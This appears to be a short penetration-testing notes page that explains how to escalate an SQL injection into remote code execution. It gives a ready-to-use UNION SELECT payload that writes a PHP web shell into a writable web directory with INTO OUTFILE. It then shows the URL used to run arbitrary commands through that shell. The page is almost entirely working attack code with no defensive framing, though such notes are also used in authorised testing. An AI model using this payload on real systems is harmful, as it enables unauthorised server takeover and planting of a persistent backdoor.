---
description: Getting an RCE through SQLI
---

# SQLI to RCE

**Context:**&#x20;

{% content-ref url="../vulnerabilities/sqli/sqli-or-error-based.md" %}
[sqli-or-error-based.md](../vulnerabilities/sqli/sqli-or-error-based.md)
{% endcontent-ref %}

**Note** You need to find a location that has to write permission during the information-gathering phase. \
Ex: `/var/www/example/banners/`

### Payload:

```
...php?id=agency' union all select 1,2,3,4, "<?php system($_GET['hack']); ?>" INTO OUTFILE "/var/www/example/banners/blankheart.php"  %23
```

**Note:** In this case, the application interprets php-lang

### On Application

```
http://example.com/banners/blankheart.php?hack=command
```
